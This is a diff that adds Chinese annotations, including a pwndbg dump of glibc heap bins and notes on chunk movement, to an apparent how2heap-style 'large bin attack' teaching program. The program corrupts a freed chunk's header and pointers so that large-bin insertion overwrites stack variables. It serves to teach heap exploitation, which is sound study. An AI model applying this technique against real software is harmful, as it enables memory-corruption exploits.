@@ -89,6 +89,28 @@ int main()
             " at the head of the large bin freelist. To overwrite the stack variables, we set \"bk\" to 16 bytes before stack_var1 and"
             " \"bk_nextsize\" to 32 bytes before stack_var2\n\n");
 
+    /*
+        此时的内存布局
+        pwndbg> bins
+        fastbins
+        0x20: 0x0
+        0x30: 0x0
+        0x40: 0x0
+        0x50: 0x0
+        0x60: 0x0
+        0x70: 0x0
+        0x80: 0x0
+        unsortedbin
+        all: 0x5555557577a0 —▸ 0x5555557570a0 —▸ 0x7ffff7dd3b58 (main_arena+88) ◂— 0x5555557577a0
+        smallbins
+        empty
+        largebins
+        0x400: 0x555555757360 —▸ 0x7ffff7dd3f48 (main_arena+1096) ◂— 0x555555757360
+        pwndbg> print p2
+        $1 = (unsigned long *) 0x555555757370
+        pwndbg> print p3
+        $2 = (unsigned long *) 0x5555557577b0
+    */
     p2[-1] = 0x3f1;
     p2[0] = 0;
     p2[2] = 0;
@@ -97,6 +119,11 @@ int main()
 
     //------------------------------------
 
+    /*
+        unsortedbins -> p3_chunk -> p1剩余部分_chunk
+        largebins -> p2_chunk
+        将 p3 从 unsortedbins 中取出,插入到 largebins 与 p2 之间
+    */
     malloc(0x90);
  
     fprintf(stderr, "Let's malloc again, so the freed third large chunk being inserted into the large bin freelist."
